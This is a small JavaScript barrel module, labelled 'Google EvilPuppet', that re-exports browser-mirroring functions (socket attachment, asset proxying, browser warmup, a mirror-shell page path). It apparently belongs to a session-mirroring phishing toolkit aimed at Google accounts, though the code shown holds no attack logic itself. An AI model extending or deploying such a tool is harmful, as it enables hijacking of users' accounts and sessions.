/** Slim Google EvilPuppet barrel — exported API for server.js */

import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { attachMirrorSocket, proxyMirrorAsset } from './sync.js';
import { warmupBrowser } from './session.js';

const __dirname = dirname(fileURLToPath(import.meta.url));

export { attachMirrorSocket, proxyMirrorAsset };

export async function warmupMirrorBrowser(config) {
  return warmupBrowser(config);
}

export function getMirrorShellPath() {
  return join(__dirname, '..', '..', 'public', 'mirror-shell.html');
}
